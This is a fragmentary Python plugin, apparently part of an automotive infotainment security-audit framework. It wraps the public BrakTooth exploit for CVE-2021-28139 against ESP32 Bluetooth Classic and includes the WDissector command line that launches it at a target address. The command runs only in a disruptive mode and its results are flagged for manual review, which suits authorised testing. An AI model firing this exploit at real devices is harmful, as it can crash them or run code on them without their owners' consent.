#!/usr/bin/env python3
"""CVE-2021-28139 – BrakTooth BT Classic: Invalid Feature Page Execution – ESP32 BT Classic ACE via malformed feature page.

Public PoC source: https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks
  Attack module: invalid_feature_page_execution
...
Usage:
  Load exploit module "invalid_feature_page_execution" via WDissector:
    sudo ./wdissector --exploit=invalid_feature_page_execution --target=<bdaddr>
"""
...
VULN = {
    ...
    "summary": "Invalid Feature Page Execution – ESP32 BT Classic ACE via malformed feature page",
...
def _run_poc(plugin):
    ...
    evidence = {
        "cve": "CVE-2021-28139",
        "braktooth_module": "invalid_feature_page_execution",
        ...
        "attack_surface": "ESP32 BT Classic invalid feature page execution → ACE/deadlock",
    }
    ...
    if allow_disruptive and target:
        ...
        cmd[1] = f"--exploit=invalid_feature_page_execution"
    ...
    return {
        ...
        "evidence": evidence,
        "requires_manual_review": True,
        "poc_source": "Matheus-Garbelini/braktooth / module: invalid_feature_page_execution",
    }


_module = "invalid_feature_page_execution"  # exploit module name
try:
...
class Poc106CVE202128139BrakToothBtClassicAuditPlugin(IVIVulnerabilityPlugin):
    meta_generated_source = "public_poc_exp_50_more"
    meta_display_id = "POC-WIRELESS-106"
    meta_poc_name   = 'CVE-2021-28139 BrakTooth ESP32 Invalid Feature Page Active Validation'
    meta_cve_id     = "CVE-2021-28139"
    meta_severity   = "High"
    ...
    meta_attack_surface = "ESP32 BT Classic invalid feature page execution → ACE/deadlock"
    is_disruptive   = True
...
if __name__ == "__main__":
    ...
    _desc = VULN.get("summary", "106_Invalid_Feature_Page_Execution__ESP32_B_Audit") if "VULN" in dir() else "106_Invalid_Feature_Page_Execution__ESP32_B_Audit"
    ...
    _plugin = Poc106CVE202128139BrakToothBtClassicAuditPlugin({
